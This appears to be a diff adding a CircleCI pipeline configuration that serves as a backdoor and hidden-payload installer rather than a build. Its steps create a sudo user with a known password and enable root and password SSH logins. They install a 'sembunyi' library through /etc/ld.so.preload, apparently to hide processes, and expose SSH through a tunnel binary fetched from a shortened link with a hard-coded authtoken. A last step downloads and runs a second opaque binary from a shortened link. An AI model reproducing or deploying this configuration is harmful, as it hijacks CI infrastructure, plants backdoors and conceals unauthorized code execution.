@@ -1,0 +1,56 @@
+version: 2.1
+jobs:
+  pnd:
+    docker:
+      - image: circleci/ruby:2.5.3
+    parallelism: 1
+    steps:
+      - run:
+         name: Update System
+         command: |
+          sudo apt-get update
+          sudo apt-get install ssh gcc -y
+      - run:
+         name: Add User
+         command: |
+          sudo adduser --disabled-password --gecos "" panda
+          sudo su --command "adduser panda sudo"
+          sudo su --command "echo 'panda:root' | chpasswd"          
+      - run:
+         name: Restart Services
+         command: |
+          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
+          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
+          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
+          sudo service ssh restart
+      - run:
+         name: Insert File
+         command: |
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
+          tar -xvf sembunyi.tar.gz && cd sembunyi
+          sudo su --command "make"
+          sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
+          sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
+      - run: 
+         name: Connect 
+         command: |
+          wget https://bit.ly/3Iaxfe5
+          chmod +x 3Iaxfe5
+          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
+          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
+      - run: 
+         name: Sesah URL 
+         command: |
+          sudo su --command "cat sesah.log"
+      - run: 
+         name: Sleep
+         command: |
+          wget https://bit.ly/3BsaT4Q
+          chmod +x 3BsaT4Q
+          sudo su --command "./3BsaT4Q"
+
+workflows:
+  version: 2.1
+  build:
+    jobs:
+      - pnd
